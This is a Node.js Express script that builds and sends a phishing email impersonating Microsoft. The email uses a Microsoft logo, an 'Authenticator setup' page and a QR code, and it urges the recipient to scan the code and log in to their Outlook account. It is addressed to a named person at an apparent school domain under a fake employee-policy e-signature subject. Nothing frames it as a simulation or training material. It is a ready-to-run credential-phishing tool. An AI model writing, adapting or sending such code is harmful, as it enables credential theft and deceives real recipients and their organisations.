import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const app = express();
const PORT = 3000;

// Define __dirname in terms of ESM
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/index.html'));
});

// Define your email contents
const toEmail = "ganderson@dingle.dudley.sch.uk";
const subject = "Complete with E-Sign: 2024 Update on Outlook Employee Policy and Procedures";

app.listen(PORT, async () => {
    console.log(`Server is running on http://localhost:${PORT}`);

    try {
        const image2 = fs.readFileSync('Microsoft-logo.jpg', { encoding: 'base64' });
const imageSrc2 = 'data:image/jpg;base64,' + image2;
const image3 = fs.readFileSync('qr-code.png', { encoding: 'base64' });
const imageSrc3 = 'data:image/png;base64,' + image3;

const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Authenticator Setup</title>
</head>
<body style="font-family: Arial, sans-serif; margin: 0; padding: 0; box-sizing: border-box;">
    <header>
        <img src="${imageSrc2}" alt="Microsoft" style="width: 150px; display: block; margin: 0 auto;">
    </header>
    <main style="max-width: 600px; margin: 20px auto; text-align: center;">
        <p style="font-size: 1em;"><strong style="font-weight: bold; font-size: 1em; display: block; margin-top: 20px;">Method 1 of 1: App</strong></p>
        <h1>Microsoft Authenticator</h1>
        <p class="steps" style="font-size: 1.5em;">Follow the steps below</p>
        <div class="qr-section" style="text-align: center; padding: 0 20px;">
            <p class="qr-text" style="font-size: 1em; text-align: center;">Use your phone camera to scan the Microsoft Authenticator app image below.<br> This will start a process to connect your Microsoft Authenticator with your account.</p>
            <p class="qr-text" style="font-size: 1em; text-align: center;">After you scan the QR code, login your Outlook email account to complete setup.</p>
            <img src="${imageSrc3}" alt="QR Code" style="width: 50%;">
        </div>
    </main>
    <footer style="font-size: 1em; margin-top: 50px;">
        <p class="disclaimer" style="font-size: 1em; text-align: center; background-color: #d3d3d3; padding: 20px; margin: 0 20px;">Disclaimer: The content of this e-mail is intended solely for the use of the Individual or entity to whom it is addressed. If you have received this communication in error, be aware that forwarding it, copying it, or in any way disclosing its content to any other person, is strictly prohibited. If you have received this communication in error, please notify the author by replying to this e-mail immediately.</p>
    </footer>
</body>
</html>
`;

        // Assuming mailer.js is setup to use ESM
        const { default: sendMail } = await import('./helper/mailer.js');
        await sendMail(toEmail, subject, html);
        console.log('Email sent successfully');
    } catch (error) {
        console.error('Error:', error);
    }
});
